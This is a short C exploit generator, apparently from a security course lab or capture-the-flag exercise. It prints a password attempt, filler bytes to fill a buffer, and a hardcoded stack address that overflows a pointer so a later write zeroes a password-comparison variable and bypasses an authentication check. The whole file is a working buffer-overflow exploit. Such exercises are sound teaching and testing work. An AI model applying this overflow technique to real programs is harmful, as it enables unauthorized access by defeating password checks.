#include <stdio.h> 
#include <stdlib.h>

int main(int argc, char *argv[])
{
    int * pwd_diff_addr = (int *) 0xeffff964;                       // Address of variable we want to overwrite
    //int * pwd_diff_addr = (int *) strtol(argv[1], NULL, 16);      // Want to do this but couldn't quite get to work

    fwrite("arg1 ", 1, 5, stdout);                                  // Password attempt
    fwrite("thisisrandomfillerforbuffer", 1, 16, stdout);           // Fill state.buffer
    fwrite(&pwd_diff_addr, 1, sizeof(pwd_diff_addr), stdout);       // overflow state.x so it points to pwd_diff
    fwrite(" 0", 1, 2, stdout);                                     // write 0 to dereferenced state.x which should modify pwd_diff
    return 0;
}
